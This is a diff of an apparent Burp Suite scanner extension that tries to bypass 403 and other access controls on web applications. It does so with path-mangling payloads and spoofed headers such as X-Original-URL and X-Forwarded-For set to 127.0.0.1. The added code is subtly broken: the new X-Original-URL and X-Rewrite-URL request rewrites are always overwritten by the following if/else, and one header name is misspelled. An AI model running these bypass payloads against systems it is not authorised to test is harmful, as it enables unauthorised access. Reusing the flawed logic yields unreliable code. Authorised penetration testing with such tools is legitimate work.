@@ -47,6 +47,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             return None
         
         OldReq = self._helpers.bytesToString(baseRequestResponse.getRequest())
+        OriginalUrl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
         Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
         if Rurl != "/":
             Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath().rstrip("/")
@@ -58,7 +59,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
 
         payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/",LastPath+"?",LastPath+"??","/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring"]
-        hpayloads = ["X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath,"Referer: /"+LastPath,"X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1"]
+        hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1"]
         results = []
 
         for p in payloads:
@@ -72,9 +73,13 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             
 
         for hp in hpayloads:
-            if hp.startswith("Referer:") and "Referer:" in OldReq:
-                NewReq = self.rplHeader(OldReq, "Referer", hp) #.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
-            else:
+            if hp.startswith("X-Original-URL:"):
+                NewReq = OldReq.replace(Rurl, Rurl+"4nyth1ng")
+            if hp.startswith("X-Rewrite-URL:"):
+                NewReq = OldReq.replace(Rurl, "/")
+            if hp.startswith("Referer:") and "Referer:" in OldReq: #Replace header
+                NewReq = self.rplHeader(OldReq, "Referer", hp)
+            else: #Add header
                 NewReq = OldReq.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
             # self.stdout.println(NewReq)
             checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
